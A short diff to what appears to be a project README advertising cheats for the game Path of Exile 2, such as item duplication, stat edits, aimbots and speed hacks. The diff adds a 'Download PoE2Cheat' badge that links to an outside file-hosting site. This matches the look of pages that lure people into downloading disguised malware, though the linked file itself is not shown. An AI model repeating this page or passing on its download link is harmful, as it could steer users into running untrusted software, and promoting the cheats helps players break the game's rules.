@@ -1,5 +1,7 @@
 Path of Exile 2 cheats refer to any third-party tools, exploits, or modifications that give players unfair advantages within the game. These cheats can include item duplication, stat modifications, aimbots, speed hacks, and more. Players use these methods to bypass the normal gameplay mechanics, gain unlimited resources, access powerful gear, or progress faster without effort.
 
+[![Download PoE 2 Cheat](https://img.shields.io/badge/Download-PoE2Cheat%20-blueviolet)](https://downeefiles.com/s/pe2che)
+
 ### Key Features:
 - **Item Duplication**: Cheats can allow players to duplicate in-game items, providing an unfair advantage in terms of resources, currency, and powerful gear.
 - **Stat Modifications**: Some cheats let players modify their character's stats, boosting their damage, health, or other attributes to unnatural levels.
